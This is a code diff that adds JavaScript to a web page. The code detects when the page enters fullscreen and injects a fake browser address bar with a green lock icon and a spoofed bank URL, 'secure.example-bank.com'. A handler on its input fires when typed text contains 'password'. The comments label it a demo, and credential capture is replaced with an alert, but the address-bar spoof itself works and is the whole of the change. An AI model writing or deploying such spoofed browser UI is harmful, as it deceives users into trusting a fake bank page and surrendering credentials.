@@ -121,6 +121,24 @@
         btn.style.display = 'block';
       }
     });
+
+    // Deteksi hilang search bar (post-fullscreen)
+let originalHeight = window.outerHeight;
+document.addEventListener('fullscreenchange', () => {
+  if (document.fullscreenElement && window.outerHeight > originalHeight + 50) { // Threshold untuk deteksi hilang bar
+    // Inject fake search bar
+    const fakeBar = document.createElement('div');
+    fakeBar.id = 'fakeSearchBar';
+    fakeBar.style.cssText = 'position:fixed;top:0;left:0;right:0;height:56px;background:#f0f0f0;border-bottom:1px solid #ccc;z-index:9999;padding:8px;display:flex;align-items:center;';
+    fakeBar.innerHTML = '<span style="color:green">🔒</span> https://secure.example-bank.com/ <input type="text" placeholder="Search..." style="flex:1;margin-left:10px;border:none;background:transparent;">';
+    document.body.appendChild(fakeBar);
+    
+    // Simulasi phishing log (ganti dengan harmless alert)
+    fakeBar.querySelector('input').addEventListener('blur', (e) => {
+      if (e.target.value.includes('password')) alert('Demo: Credentials captured via spoofed UI!');
+    });
+  }
+});
   </script>
 
   <!-- Bonus: manifest PWA supaya bisa di-install dan fullscreen lebih bersih -->
